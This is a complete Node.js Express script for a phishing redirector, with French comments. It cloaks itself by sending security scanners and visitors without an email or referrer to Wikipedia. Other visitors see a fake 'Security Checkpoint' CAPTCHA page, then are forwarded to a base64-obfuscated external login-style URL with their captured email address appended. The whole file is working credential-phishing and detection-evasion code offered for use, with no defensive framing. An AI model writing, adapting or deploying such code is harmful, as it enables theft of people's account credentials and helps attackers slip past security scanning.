const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// Tes cibles encodées
const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.all('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const referrer = req.headers['referrer'] || req.headers['referer'] || "";
    
    // Capture de l'email via paramètre 'm' ou via Azure
    const targetEmail = req.query.m || req.body?.login_hint || req.query.login_hint || "";
    
    const isDebug = req.query.debug === "true";
    
    // On bloque les User-Agents typiques des scanners mais on laisse passer les navigateurs classiques
    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|virus|censys/i.test(ua);
    
    // PROTECTION : On ne redirige vers Wikipedia QUE si on n'a absolument aucune info (ni mail, ni referrer connu)
    // On retire la vérification stricte du referrer pour SharePoint car il le nettoie souvent
    if (!isDebug && (isBotUA || (targetEmail === "" && referrer === ""))) {
        return res.redirect("https://www.wikipedia.org");
    }

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Security Checkpoint</title>
            <style>
                body { background: #fdf2f2; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .container { background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: left; max-width: 420px; width: 90%; overflow: hidden; }
                .header { background: #f5a623; color: white; display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; font-weight: 600; font-size: 11px; letter-spacing: 1px; }
                .content { padding: 30px 25px; }
                h2 { color: #1b1f23; font-size: 20px; margin: 0 0 8px 0; font-weight: 700; }
                #statusText { font-size: 14px; line-height: 1.6; color: #586069; margin: 0 0 25px 0; }
                .checkpoint-box { background: #f8f9fa; border: 1px solid #e0e6ed; border-radius: 8px; padding: 18px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
                #customCheckbox { width: 24px; height: 24px; border: 2px solid #d1d5da; border-radius: 4px; background: white; margin-right: 15px; flex-shrink: 0; }
                #loader { display: none; border: 3px solid rgba(245, 166, 35, 0.1); border-top: 3px solid #f5a623; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .main-text { font-weight: 600; font-size: 14px; color: #1b1f23; }
                .sub-text { color: #586069; font-size: 12px; }
                .footer { padding: 0 25px 20px; display: flex; justify-content: space-between; font-size: 11px; color: #888; }
                .dot { width: 6px; height: 6px; background: #28a745; border-radius: 50%; margin-right: 8px; display: inline-block; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">🔒 SECURITY CHECKPOINT <div>•••</div></div>
                <div class="content">
                    <h2>Security Verification</h2>
                    <p id="statusText">Please confirm to continue</p>
                    <div class="checkpoint-box" id="clickArea">
                        <div style="display:flex; align-items:center;">
                            <div id="customCheckbox"></div>
                            <div id="loader"></div>
                            <div>
                                <div class="main-text" id="mainMsg">I am not a robot</div>
                                <div class="sub-text">Click to verify your browser</div>
                            </div>
                        </div>
                        <div style="color:#d1d5da;" id="arrow">→</div>
                    </div>
                </div>
                <div class="footer"><div><span class="dot"></span> SECURE CONNECTION</div><div>Protected by Shield</div></div>
            </div>
            <script>
                document.getElementById('clickArea').addEventListener('click', function() {
                    const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                    document.getElementById('customCheckbox').style.display = 'none';
                    document.getElementById('loader').style.display = 'block';
                    document.getElementById('statusText').innerText = "Verifying browser integrity...";
                    document.getElementById('mainMsg').innerText = "Processing...";
                    
                    setTimeout(() => {
                        let target = atob(p1) + atob(p2);
                        if(em !== "") target += (target.includes('?') ? '&' : '?') + "m=" + em;
                        window.location.href = target;
                    }, 3500); 
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
